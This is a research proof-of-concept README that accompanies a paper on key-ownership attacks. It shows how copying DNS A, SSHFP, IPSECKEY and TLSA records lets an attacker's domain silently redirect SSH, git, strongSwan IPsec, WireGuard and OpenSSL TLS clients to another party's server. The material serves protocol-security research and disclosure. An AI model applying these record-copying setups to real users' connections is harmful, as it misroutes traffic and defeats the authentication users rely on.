# Proof of Concept implementations of redirection attacks

The client and server configuration run on Ubuntu. We tested with Ubuntu 22.04 and 24.04, however, most likely these examples would work with any Linux distro.

We follow the same naming convention as with our paper "Attacks on Key Ownership in Security Protocols". The domains used for testing are replaced with the example domains `low.example` and `high.example`. The former is the attacker-controlled domain, while the latter belongs to honest operators.

We set up DNS server with DNSSEC for "`low.example`" and "`high.example`" in order to add all the DNS records (A, SSHFP, IPSECKEY, TLSA) required to show redirection in practice. 

The configurations presented here have been tested on actual domains and the DNS records documented here were used for testing. Some published records and keys are truncated for brevity.

## Redirection in SSH

OpenSSH can use DNSSEC for public key authentication if the `VerifyHostKeyDNS` setting is set to `yes` in either of ` ~/.ssh/config` or `/etc/ssh/ssh_config`. 

In addition, the `trust-ad` option should be set in `/etc/resolv.conf`. This allows the `AD` (Authentic Data) flag to be set in DNS queries and kept by the stub resolver when processing DNS responses. The flag in the response signals that the resource record has been cryptographically validated using DNSSEC.

The honest DNS records for `high.example`:
```dns
; ==========================================
;  Zone: high.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

; --- SSHFP ---
        IN    SSHFP 4 2 180aa08111192875210d695a30cb378b2a49d8310329553990b2a37e8cf581fe
```

The malicios DNS records for `low.example` (an exact copy of `high.example` DNS records):

```dns
; ==========================================
;  Zone: low.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

; --- SSHFP ---
        IN    SSHFP 4 2 180aa08111192875210d695a30cb378b2a49d8310329553990b2a37e8cf581fe
```

Now, any SSH connection to `low.example` redirects to `high.example` with no message from OpenSSH that the keys have changed.

``` bash
$ ssh user@low.example # routes to user@high.example
```

``` bash
$ sftp user@low.example # routes to user@high.example
```

Similarly, for git:

```bash
$ git remote add origin git@low.example:/home/git/repo.git

```
If `low.example` changes the DNS records before, or even after, the repository setup at the client, the commits and actions can be redirected to the repo at `high.example`. 

These redirection attacks have been tested with OpenSSH versions 8.9, 9.6, 9.8 for the client and the servers respectively. 

---

## Redirection in IPsec


This example configuration was tested on strongSwan version 6.0.0. strongSwan needs to be compiled with the flag `--enable-ipseckey` set in the `./configure` command for DNS-based authentication to work. strongSwan also requires the `unbound` library to be installed and the DNSSEC Trust Anchors to be configured at the client.

The honest DNS records for `high.example`:
```dns
; ==========================================
;  Zone: high.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

; --- IPSECKEY ---
        IN  IPSECKEY 10 0 2 . AwEAAb7/h8P863QKbeBPGjECrf6A3Pti+PP...
```

The malicios DNS records for `low.example` (an exact copy of `high.example` DNS records):

```dns
; ==========================================
;  Zone: low.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

; --- IPSECKEY ---
        IN  IPSECKEY 10 0 2 . AwEAAb7/h8P863QKbeBPGjECrf6A3Pti+PP...
```

The client's strongSwan configuration file `swanctl.conf`:

```
connections {
    ipsec-ikev2-vpn-client {
        version = 2
        local_addrs = %any
        remote_addrs = low.example
        vips = 0.0.0.0
        proposals = aes256-sha256-modp2048
        local {
            auth = pubkey
            certs = clientcert.pem
            id = client.example

        }
        remote {
            auth = pubkey
            id = low.example
        }
    }
}

```

The insecure configuration of `high.example`'s strongSwan configuration file `swanctl.conf`:

```
connections {
    ipsec-ikev2-vpn {
        remote_addrs = %any
        pools = ip_addrs
        unique = replace
        version = 2
        proposals = aes256-sha256-modp2048
        local {
            id = %any
            auth = pubkey
            pubkeys = serverpubkey.pem
            }
        remote {
            auth = pubkey
            id = client.example
        }
        children {
            vpn {
                start_action = start
                mode = tunnel
                local_ts = 0.0.0.0/0
                esp_proposals = aes256-sha256
            }
        }
    }
}

pools {
    ip_addrs {
        addrs = 192.168.96.0/24
    }
}

```

With this configuration, `high.example` accepts the client's connection and the client thinks it has established a VPN connection with `low.example`.

---

## Redirection in WireGuard

The WireGuard redirection attack works if the client has set up two interfaces to separate the communication with `high.example` and `low.example`. The owner of `low.example` needs to redirect the WireGuard connection to `high.example`. One way to achieve this is through DNS where the domain owner of `low.example` copies the A record of `high.example`

The honest DNS record for `high.example`:
```dns
; ==========================================
;  Zone: high.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

```

The malicios DNS records for `low.example` (an exact copy of `high.example` DNS records):

```dns
; ==========================================
;  Zone: low.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

```

The client WireGuard configuration `/etc/wireguard/wg0.conf` for `high.example`:
```
[Interface]
PrivateKey = cEYOFp...
Address = 10.251.251.25/24


[Peer]
PublicKey = vVSzEzAUUrU...
AllowedIPs = 10.251.251.0/24
Endpoint = high.example:8080
```

The client WireGuard configuration `/etc/wireguard/wg1.conf` for `low.example`:

```
[Interface]
PrivateKey = cEYOFp...
Address = 10.251.251.25/24

[Peer]
PublicKey = vVSzEzAUUrU...
AllowedIPs = 10.251.251.0/24
Endpoint = low.example:8080
```

Notice that the only difference in the configuration is the Peer's Internet `Endpoint` which is resolved to the same IP address.

---

## Redirection in TLS

The same attack can happen in TLS, where `low.example` copies the A and TLSA records of `high.example`.

The OpenSSL library adds support for raw public key authentication starting from version 3.2. OpenSSL also supports DANE-based authentication in which TLSA resource records can be used to authenticate public keys and certificates.

```dns
; ==========================================
;  Zone: high.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

; --- TLSA ---
        IN    TLSA 3 1 1 	F4D9CF3B4E251085A4F3193DAAF3A5141...
```

The malicios DNS records for `low.example` (an exact copy of `high.example` DNS records): 

```dns
; ==========================================
;  Zone: low.example
; ==========================================
.
.
.

; --- Hosts ---
        IN  A     W.X.Y.Z

; --- TLSA ---
        IN    TLSA 3 1 1 	F4D9CF3B4E251085A4F3193DAAF3A5141...
```

The OpenSSL `s_client` command can directly take the DANE TLSA resource record for testing purposes.

The command:

```bash
$ openssl s_client -connect low.example:25 -trace -dane_tlsa_domain "low.example" -dane_tlsa_rrdata "3 1 1 F4D9CF3B4E251085A4F3193DAAF3A5141..." -starttls smtp -enable_server_rpk
```
ends up establishing a successful TLS connection to the wrong SMTP server `high.example` 